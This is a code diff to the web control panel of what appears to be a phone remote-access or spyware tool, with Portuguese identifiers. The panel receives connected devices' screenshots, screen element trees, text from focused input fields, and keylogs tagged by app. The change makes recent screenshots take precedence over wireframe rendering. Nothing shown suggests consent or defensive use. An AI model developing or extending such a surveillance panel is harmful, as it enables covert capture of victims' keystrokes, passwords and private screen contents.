@@ -177,6 +177,7 @@ body{font-family:system-ui,sans-serif;background:#0f1117;color:#e2e8f0;height:10
 
 <script>
 const SERVER = window.location.origin.replace(/^http/, 'ws');
+let ultimoScreenshot = 0;
 let ws = null, deviceAtual = null;
 let dw = 1080, dh = 2340;
 let abaAtual = 'log', overlayAtivo = false;
@@ -198,8 +199,14 @@ function conectar() {
     switch (msg.tipo) {
       case 'lista_clientes':   renderClientes(msg.clientes); break;
       case 'sessao_iniciada':  onSessaoIniciada(msg); break;
-      case 'arvore_tela':      desenharWireframe(JSON.parse(msg.elementos), msg.pacote); break;
-      case 'screenshot':       mostrarScreenshot(msg.frame); break;
+      case 'arvore_tela':
+        // Só desenha wireframe se não recebeu screenshot recentemente
+        if(Date.now() - ultimoScreenshot > 2000) desenharWireframe(JSON.parse(msg.elementos), msg.pacote);
+        break;
+      case 'screenshot':
+        ultimoScreenshot = Date.now();
+        mostrarScreenshot(msg.frame);
+        break;
       case 'keylog':           logKey(msg.texto, msg.app || '?'); break;
       case 'campo_texto_focado':
         abrirInputTexto(msg.texto_atual || '');
